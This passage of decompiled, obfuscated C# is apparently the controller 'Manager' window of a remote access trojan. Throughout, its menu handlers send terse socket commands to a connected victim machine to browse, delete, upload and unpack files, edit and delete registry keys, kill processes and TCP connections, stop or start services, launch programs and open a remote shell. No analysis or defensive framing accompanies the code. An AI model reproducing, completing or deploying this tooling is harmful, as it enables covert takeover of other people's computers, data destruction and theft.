							ListViewItem listViewItem = (ListViewItem)obj;
							text4 = text4 + " \"" + listViewItem.Text + "\"";
						}
					}
					finally
					{
						
					}
					text += Class6.smethod_14(ref text4);
					this.sk.Send(text);
				}
			}
		}

		// Token: 0x060003E9 RID: 1001 RVA: 0x00168C28 File Offset: 0x00167028
		private void UnRarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				string toolTipText = listViewItem.ToolTipText;
				listViewItem.ToolTipText = toolTipText;
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"unrar",
					Class7.string_1
				}) + Class6.smethod_14(ref toolTipText);
				this.sk.Send(text);
			}
		}

		// Token: 0x060003EA RID: 1002 RVA: 0x00168CD4 File Offset: 0x001670D4
		private void UploadFromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.TextBox1.Text, string.Empty, false) != 0;
			if (flag)
			{
				FromLink fromLink = new FromLink();
				fromLink.ShowDialog(this);
				flag = fromLink.IsOK;
				if (flag)
				{
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "fl";
					array[5] = Class7.string_1;
					TextBox textBox = fromLink.TextBox1;
					string text = textBox.Text;
					textBox.Text = text;
					array[6] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					string[] array2 = array;
					int num = 8;
					string text2 = this.TextBox1.Text + fromLink.TextBox2.Text;
					array2[num] = Class6.smethod_14(ref text2);
					this.sk.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x060003EB RID: 1003 RVA: 0x00168DCC File Offset: 0x001671CC
		private void RGk_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				bool isExpanded = e.Node.IsExpanded;
				if (isExpanded)
				{
					e.Node.Collapse();
				}
				else
				{
					e.Node.Expand();
				}
			}
		}

		// Token: 0x060003EC RID: 1004 RVA: 0x00168E18 File Offset: 0x00167218
		private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.ListView1.SelectedItems.Count != 0;
				if (flag)
				{
					this.cur = (Manager.CR)this.ListView1.SelectedIndices[0];
					switch (this.cur)
					{
					case Manager.CR.fm:
						this.FMM.BringToFront();
						this.LPR.SendToBack();
						this.LTCP.SendToBack();
						this.RG.SendToBack();
						this.RG.SendToBack();
						this.sh.SendToBack();
						this.LSRV.SendToBack();
						this.L2.method_3();
						break;
					case Manager.CR.PR:
						this.LPR.BringToFront();
						this.LPR.method_3();
						break;
					case Manager.CR.tcp:
						this.LTCP.BringToFront();
						this.LTCP.method_3();
						break;
					case Manager.CR.reg:
						this.RG.BringToFront();
						break;
					case Manager.CR.shl:
						this.sh.BringToFront();
						flag = this.shStarted == 0;
						if (flag)
						{
							this.shStarted = 1;
							this.sk.Send(string.Concat(new string[]
							{
								"Ex",
								Class7.string_1,
								"rs",
								Class7.string_1,
								"~"
							}));
						}
						break;
					case Manager.CR.srv:
						this.LSRV.BringToFront();
						this.LSRV.method_3();
						break;
					}
					this.Icon = Icon.FromHandle(((Bitmap)this.vmethod_148.Images[this.ListView1.SelectedItems[0].ImageIndex]).GetHicon());
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003ED RID: 1005 RVA: 0x0016904C File Offset: 0x0016744C
		private void KillConnectionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"tcp",
				Class7.string_1,
				"!"
			});
			bool flag = this.LTCP.SelectedItems.Count != 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.LTCP.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Tag.ToString();
					}
				}
				finally
				{
					
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x060003EE RID: 1006 RVA: 0x00169138 File Offset: 0x00167538
		private void RefreshToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"fm",
				Class7.string_1,
				"~"
			}));
		}

		// Token: 0x060003EF RID: 1007 RVA: 0x00169190 File Offset: 0x00167590
		private void CreateKeyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null && this.RGk.SelectedNode.FullPath.Contains("\\");
			if (flag)
			{
				string text = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1);
				flag = text.Length != 0;
				if (flag)
				{
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"#",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\",
						Class7.string_1,
						text
					}));
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\"
					}));
				}
			}
		}

		// Token: 0x060003F0 RID: 1008 RVA: 0x00169304 File Offset: 0x00167704
		private void DeleteSelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				string fullPath = this.RGk.SelectedNode.FullPath;
				flag = fullPath.Contains("\\");
				if (flag)
				{
					string text = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 1];
					string text2 = string.Empty;
					int num = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 2;
					for (int i = 0; i <= num; i++)
					{
						text2 = text2 + Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[i] + "\\";
					}
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"$",
						Class7.string_1,
						text2,
						Class7.string_1,
						text
					}));
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						text,
						"\\"
					}));
				}
			}
		}

		// Token: 0x060003F1 RID: 1009 RVA: 0x001694B0 File Offset: 0x001678B0
		private void StopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"!",
					text
				}));
			}
		}

		// Token: 0x060003F2 RID: 1010 RVA: 0x001695A0 File Offset: 0x001679A0
		private void PauseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"@",
					text
				}));
			}
		}

		// Token: 0x060003F3 RID: 1011 RVA: 0x00169690 File Offset: 0x00167A90
		private void StartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"#",
					text
				}));
			}
		}

		// Token: 0x060003F4 RID: 1012 RVA: 0x00169780 File Offset: 0x00167B80
		private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rd"
				});
				try
				{
					foreach (object obj in this.L2.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						flag = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + Class7.string_1 + Class6.smethod_14(ref toolTipText);
						}
					}
				}
				finally
				{
					
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x060003F5 RID: 1013 RVA: 0x001698A8 File Offset: 0x00167CA8
		private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.RGk.Enabled = false;
				this.RGLIST.Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
			}
		}

		// Token: 0x060003F6 RID: 1014 RVA: 0x00169958 File Offset: 0x00167D58
		private void vmethod_26_Tick(object sender, EventArgs e)
		{
			this.vmethod_26.Enabled = false;
			bool flag = this.sk == null;
			if (flag)
			{
				this.Close();
			}
			else
			{
				flag = !this.sk.CN;
				if (flag)
				{
					this.Close();
				}
				else
				{
					try
					{
						switch (this.cur)
						{
						case Manager.CR.PR:
							this.vmethod_26.Interval = 2000;
							flag = !this.PRNXT;
							if (!flag)
							{
								IEnumerator enumerator = this.LPR.Items.GetEnumerator();
								string text = string.Empty;
								for (;;)
								{
									flag = enumerator.MoveNext();
									if (!flag)
									{
										break;
									}
									ListViewItem listViewItem = (ListViewItem)enumerator.Current;
									flag = listViewItem != null;
									if (flag)
									{
										text = text + Class7.string_1 + listViewItem.SubItems[1].Text;
									}
								}
								this.sk.Send(string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"proc",
									Class7.string_1,
									"U",
									text
								}));
								this.PRNXT = false;
							}
							break;
						case Manager.CR.tcp:
							this.vmethod_26.Interval = 2000;
							flag = this.TCPNXT;
							if (flag)
							{
								string text2 = string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"tcp",
									Class7.string_1,
									"~",
									Class7.string_1
								});
								try
								{
									foreach (object obj in this.LTCP.Items)
									{
										ListViewItem listViewItem2 = (ListViewItem)obj;
										text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1;
									}
								}
								finally
								{
									
								}
								this.sk.Send(text2);
								this.TCPNXT = false;
							}
							break;
						case Manager.CR.srv:
							this.vmethod_26.Interval = 4000;
							flag = this.srvNxt;
							if (flag)
							{
								string text3 = string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"srv",
									Class7.string_1,
									"~"
								});
								this.sk.Send(text3);
								this.srvNxt = false;
							}
							break;
						}
					}
					catch (Exception ex)
					{
					}
					this.vmethod_26.Enabled = true;
				}
			}
		}

		// Token: 0x060003F7 RID: 1015 RVA: 0x00169CB4 File Offset: 0x001680B4
		private void L1_DoubleClick1(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedItems.Count != 0;
			if (flag)
			{
				this.exp(this.L1.SelectedItems[0].ToolTipText, false);
			}
		}

		// Token: 0x060003F8 RID: 1016 RVA: 0x00169CFC File Offset: 0x001680FC
		private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L2.SelectedItems.Count <= 0;
				if (!flag)
				{
					string text = string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"fm",
						Class7.string_1,
						"dl",
						Class7.string_1
					});
					try
					{
						try
						{
							foreach (object obj in this.L2.SelectedItems)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								flag = Operators.CompareString(listViewItem.Text, "..", false) != 0;
								if (flag)
								{
									bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
									if (flag2)
									{
										string text2 = text;
										string text3 = Class7.string_1;
										string text4 = listViewItem.ToolTipText + "*!";
										string text5 = Class6.smethod_14(ref text4);
										text = text2 + text3 + text5;
									}
									else
									{
										string text6 = text;
										string text7 = Class7.string_1;
										string text8 = listViewItem.ToolTipText + "*";
										string text9 = Class6.smethod_14(ref text8);
										text = text6 + text7 + text9;
									}
								}
							}
						}
						finally
						{
							
						}
					}
					finally
					{
						
					}
					this.sk.Send(text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003F9 RID: 1017 RVA: 0x00169F10 File Offset: 0x00168310
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.RGLIST.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"@",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\",
						Class7.string_1,
						listViewItem.Text
					}));
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060003FA RID: 1018 RVA: 0x0016A000 File Offset: 0x00168400
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter Name!", "New Process", "", -1, -1);
			bool flag = Operators.CompareString(text, "", false) == 0;
			if (!flag)
			{
				NewLateBinding.LateCall(this.sk, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("nwpr", MyProject.Forms.Form1.Yy), text) }, null, null, null, true);
			}
		}

		// Token: 0x04000159 RID: 345
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400015B RID: 347
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x0400015C RID: 348
		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		// Token: 0x0400015D RID: 349
		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar _pr;

		// Token: 0x0400015E RID: 350
		[AccessedThroughProperty("M1")]
		private ContextMenuStrip _M1;

		// Token: 0x0400015F RID: 351
		[AccessedThroughProperty("KillToolStripMenuItem1")]
		private ToolStripMenuItem _KillToolStripMenuItem1;

		// Token: 0x04000160 RID: 352
		[AccessedThroughProperty("KillDeleteToolStripMenuItem")]
		private ToolStripMenuItem _KillDeleteToolStripMenuItem;

		// Token: 0x04000161 RID: 353
		[AccessedThroughProperty("RestartProcessToolStripMenuItem")]
		private ToolStripMenuItem _RestartProcessToolStripMenuItem;

		// Token: 0x04000162 RID: 354
		[AccessedThroughProperty("vmethod_26")]
		private Timer _vmethod_26;

		// Token: 0x04000163 RID: 355
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x04000164 RID: 356
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000165 RID: 357
		[AccessedThroughProperty("KillConnectionToolStripMenuItem")]
		private ToolStripMenuItem _KillConnectionToolStripMenuItem;

		// Token: 0x04000166 RID: 358
		[AccessedThroughProperty("crg")]
		private ContextMenuStrip _crg;

		// Token: 0x04000167 RID: 359
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		// Token: 0x04000168 RID: 360
		[AccessedThroughProperty("EditToolStripMenuItem")]
		private ToolStripMenuItem _EditToolStripMenuItem;

		// Token: 0x04000169 RID: 361
		[AccessedThroughProperty("NewValueToolStripMenuItem")]
		private ToolStripMenuItem _NewValueToolStripMenuItem;

		// Token: 0x0400016A RID: 362
		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem _DeleteToolStripMenuItem;

		// Token: 0x0400016B RID: 363
		[AccessedThroughProperty("rimg")]
		private ImageList _rimg;

		// Token: 0x0400016C RID: 364
		[AccessedThroughProperty("crgk")]
		private ContextMenuStrip _crgk;

		// Token: 0x0400016D RID: 365
		[AccessedThroughProperty("RefreshToolStripMenuItem1")]
		private ToolStripMenuItem _RefreshToolStripMenuItem1;

		// Token: 0x0400016E RID: 366
		[AccessedThroughProperty("CreateKeyToolStripMenuItem")]
		private ToolStripMenuItem _CreateKeyToolStripMenuItem;

		// Token: 0x0400016F RID: 367
		[AccessedThroughProperty("DeleteSelectedToolStripMenuItem")]
		private ToolStripMenuItem _DeleteSelectedToolStripMenuItem;

		// Token: 0x04000170 RID: 368
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x04000171 RID: 369
		[AccessedThroughProperty("StopToolStripMenuItem")]
		private ToolStripMenuItem _StopToolStripMenuItem;

		// Token: 0x04000172 RID: 370
		[AccessedThroughProperty("PauseToolStripMenuItem")]
		private ToolStripMenuItem _PauseToolStripMenuItem;

		// Token: 0x04000173 RID: 371
		[AccessedThroughProperty("StartToolStripMenuItem")]
		private ToolStripMenuItem _StartToolStripMenuItem;

		// Token: 0x04000174 RID: 372
		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip _ContextMenuStrip3;

		// Token: 0x04000175 RID: 373
		[AccessedThroughProperty("UPToolStripMenuItem")]
		private ToolStripMenuItem _UPToolStripMenuItem;

		// Token: 0x04000176 RID: 374
		[AccessedThroughProperty("RefreshToolStripMenuItem2")]
		private ToolStripMenuItem _RefreshToolStripMenuItem2;

		// Token: 0x04000177 RID: 375
		[AccessedThroughProperty("RunToolStripMenuItem")]
		private ToolStripMenuItem _RunToolStripMenuItem;

		// Token: 0x04000178 RID: 376
		[AccessedThroughProperty("Delete")]
		private ToolStripMenuItem _Delete;

		// Token: 0x04000179 RID: 377
		[AccessedThroughProperty("EditToolStripMenuItem1")]
		private ToolStripMenuItem _EditToolStripMenuItem1;

		// Token: 0x0400017A RID: 378
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		// Token: 0x0400017B RID: 379
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x0400017C RID: 380
		[AccessedThroughProperty("CutToolStripMenuItem")]
		private ToolStripMenuItem _CutToolStripMenuItem;

		// Token: 0x0400017D RID: 381
		[AccessedThroughProperty("PasteToolStripMenuItem")]
		private ToolStripMenuItem _PasteToolStripMenuItem;

		// Token: 0x0400017E RID: 382
		[AccessedThroughProperty("DownloadToolStripMenuItem")]
		private ToolStripMenuItem _DownloadToolStripMenuItem;

		// Token: 0x0400017F RID: 383
		[AccessedThroughProperty("UploadToolStripMenuItem")]
		private ToolStripMenuItem _UploadToolStripMenuItem;

		// Token: 0x04000180 RID: 384
		[AccessedThroughProperty("NewEmptyFileToolStripMenuItem")]
		private ToolStripMenuItem _NewEmptyFileToolStripMenuItem;

		// Token: 0x04000181 RID: 385
		[AccessedThroughProperty("NewFolderToolStripMenuItem")]
		private ToolStripMenuItem _NewFolderToolStripMenuItem;

		// Token: 0x04000182 RID: 386
		[AccessedThroughProperty("OpenDownloadsToolStripMenuItem")]
		private ToolStripMenuItem _OpenDownloadsToolStripMenuItem;

		// Token: 0x04000183 RID: 387
		[AccessedThroughProperty("RarToolStripMenuItem")]
		private ToolStripMenuItem _RarToolStripMenuItem;

		// Token: 0x04000184 RID: 388
		[AccessedThroughProperty("UnRarToolStripMenuItem")]
		private ToolStripMenuItem _UnRarToolStripMenuItem;

		// Token: 0x04000185 RID: 389
		[AccessedThroughProperty("UploadFromLinkToolStripMenuItem")]
		private ToolStripMenuItem _UploadFromLinkToolStripMenuItem;

		// Token: 0x04000186 RID: 390
		[AccessedThroughProperty("ContextMenuStrip4")]
		private ContextMenuStrip _ContextMenuStrip4;

		// Token: 0x04000187 RID: 391
		[AccessedThroughProperty("RefreshToolStripMenuItem3")]
		private ToolStripMenuItem _RefreshToolStripMenuItem3;

		// Token: 0x04000188 RID: 392
		[AccessedThroughProperty("MG")]
		private ImageList _MG;

		// Token: 0x04000189 RID: 393
		[AccessedThroughProperty("ListView1")]
		private ListView _ListView1;

		// Token: 0x0400018A RID: 394
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x0400018B RID: 395
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x0400018C RID: 396
		[AccessedThroughProperty("vmethod_148")]
		private ImageList _vmethod_148;

		// Token: 0x0400018D RID: 397
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x0400018E RID: 398
		[AccessedThroughProperty("FMM")]
		private Panel _FMM;

		// Token: 0x0400018F RID: 399
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000190 RID: 400
		[AccessedThroughProperty("L1")]
		private GClass9 _L1;

		// Token: 0x04000191 RID: 401
		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		// Token: 0x04000192 RID: 402
		[AccessedThroughProperty("ColumnHeader7")]
		private ColumnHeader _ColumnHeader7;

		// Token: 0x04000193 RID: 403
		[AccessedThroughProperty("p")]
		private PictureBox _p;

		// Token: 0x04000194 RID: 404
		[AccessedThroughProperty("L2")]
		private GClass9 _L2;

		// Token: 0x04000195 RID: 405
		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader _ColumnHeader8;

		// Token: 0x04000196 RID: 406
		[AccessedThroughProperty("ColumnHeader9")]
		private ColumnHeader _ColumnHeader9;

		// Token: 0x04000197 RID: 407
		[AccessedThroughProperty("ColumnHeader10")]
		private ColumnHeader _ColumnHeader10;

		// Token: 0x04000198 RID: 408
		[AccessedThroughProperty("LTCP")]
		private GClass9 _LTCP;

		// Token: 0x04000199 RID: 409
		[AccessedThroughProperty("ColumnHeader16")]
		private ColumnHeader _ColumnHeader16;

		// Token: 0x0400019A RID: 410
		[AccessedThroughProperty("ColumnHeader17")]
		private ColumnHeader _ColumnHeader17;

		// Token: 0x0400019B RID: 411
		[AccessedThroughProperty("ColumnHeader18")]
		private ColumnHeader _ColumnHeader18;

		// Token: 0x0400019C RID: 412
		[AccessedThroughProperty("ColumnHeader19")]
		private ColumnHeader _ColumnHeader19;

		// Token: 0x0400019D RID: 413
		[AccessedThroughProperty("ColumnHeader20")]
		private ColumnHeader _ColumnHeader20;

		// Token: 0x0400019E RID: 414
		[AccessedThroughProperty("ColumnHeader21")]
		private ColumnHeader _ColumnHeader21;

		// Token: 0x0400019F RID: 415
		[AccessedThroughProperty("RG")]
		private Panel _RG;

		// Token: 0x040001A0 RID: 416
		[AccessedThroughProperty("RGLIST")]
		private GClass9 _RGLIST;

		// Token: 0x040001A1 RID: 417
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x040001A2 RID: 418
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x040001A3 RID: 419
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x040001A4 RID: 420
		[AccessedThroughProperty("RGk")]
		private TreeView _RGk;

		// Token: 0x040001A5 RID: 421
		[AccessedThroughProperty("sh")]
		private Panel _sh;

		// Token: 0x040001A6 RID: 422
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x040001A7 RID: 423
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x040001A8 RID: 424
		[AccessedThroughProperty("LPR")]
		private GClass9 _LPR;

		// Token: 0x040001A9 RID: 425
		[AccessedThroughProperty("ColumnHeader22")]
		private ColumnHeader _ColumnHeader22;

		// Token: 0x040001AA RID: 426
		[AccessedThroughProperty("ColumnHeader23")]
		private ColumnHeader _ColumnHeader23;

		// Token: 0x040001AB RID: 427
		[AccessedThroughProperty("ColumnHeader24")]
		private ColumnHeader _ColumnHeader24;

		// Token: 0x040001AC RID: 428
		[AccessedThroughProperty("ColumnHeader25")]
		private ColumnHeader _ColumnHeader25;

		// Token: 0x040001AD RID: 429
		[AccessedThroughProperty("ColumnHeader26")]
		private ColumnHeader _ColumnHeader26;

		// Token: 0x040001AE RID: 430
		[AccessedThroughProperty("LSRV")]
		private GClass9 _LSRV;

		// Token: 0x040001AF RID: 431
		[AccessedThroughProperty("ColumnHeader11")]
		private ColumnHeader _ColumnHeader11;

		// Token: 0x040001B0 RID: 432
		[AccessedThroughProperty("ColumnHeader12")]
		private ColumnHeader _ColumnHeader12;

		// Token: 0x040001B1 RID: 433
		[AccessedThroughProperty("ColumnHeader13")]
		private ColumnHeader _ColumnHeader13;

		// Token: 0x040001B2 RID: 434
		[AccessedThroughProperty("ColumnHeader14")]
		private ColumnHeader _ColumnHeader14;

		// Token: 0x040001B3 RID: 435
		[AccessedThroughProperty("ColumnHeader15")]
		private ColumnHeader _ColumnHeader15;

		// Token: 0x040001B4 RID: 436
		[AccessedThroughProperty("vmethod_108")]
		private ImageList _vmethod_108;

		// Token: 0x040001B5 RID: 437
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040001B6 RID: 438
		public Collection Cache;

		// Token: 0x040001B7 RID: 439
		public Manager.CR cur;

		// Token: 0x040001B8 RID: 440
		public string Flist;

		// Token: 0x040001B9 RID: 441
		public Collection Images;

		// Token: 0x040001BA RID: 442
		private int int_0;

		// Token: 0x040001BB RID: 443
		private int int_1;

		// Token: 0x040001BC RID: 444
		public bool isCut;

		// Token: 0x040001BD RID: 445
		public int PID;

		// Token: 0x040001BE RID: 446
		public bool PRFX;

		// Token: 0x040001BF RID: 447
		public bool PRNXT;

		// Token: 0x040001C0 RID: 448
		public Collection RGCH;

		// Token: 0x040001C1 RID: 449
		public int shStarted;

		// Token: 0x040001C2 RID: 450
		public Client sk;

		// Token: 0x040001C3 RID: 451
		public bool SrvFX;

		// Token: 0x040001C4 RID: 452
		public bool srvNxt;

		// Token: 0x040001C5 RID: 453
		private string string_0;

		// Token: 0x040001C6 RID: 454
		private string[] string_1;

		// Token: 0x040001C7 RID: 455
		public bool TCPFX;

		// Token: 0x040001C8 RID: 456
		public bool TCPNXT;

		// Token: 0x02000017 RID: 23
		public enum CR
		{
			// Token: 0x040001CA RID: 458
			fm,
			// Token: 0x040001CB RID: 459
			PR,
			// Token: 0x040001CC RID: 460
			reg = 3,
			// Token: 0x040001CD RID: 461
			shl,
			// Token: 0x040001CE RID: 462
			srv,
			// Token: 0x040001CF RID: 463
			tcp = 2
		}

		// Token: 0x02000018 RID: 24
		public sealed class GClass13
		{
			// Token: 0x060003FB RID: 1019 RVA: 0x0016A080 File Offset: 0x00168480
			public GClass13()
			{
				this.list_0 = new List<string[]>();
				this.list_1 = new List<string>();
			}

			// Token: 0x040001D0 RID: 464
			public List<string[]> list_0;

			// Token: 0x040001D1 RID: 465
			public List<string> list_1;

			// Token: 0x040001D2 RID: 466
			public string string_0;
		}

		// Token: 0x02000019 RID: 25
		public sealed class GClass14
		{
			// Token: 0x060003FC RID: 1020 RVA: 0x0016A0A0 File Offset: 0x001684A0
			public GClass14()
			{
				this.list_0 = new List<string>();
				this.list_1 = new List<string>();
			}

			// Token: 0x040001D3 RID: 467
			public List<string> list_0;

			// Token: 0x040001D4 RID: 468
			public List<string> list_1;

			// Token: 0x040001D5 RID: 469
			public string string_0;
		}
	}
}
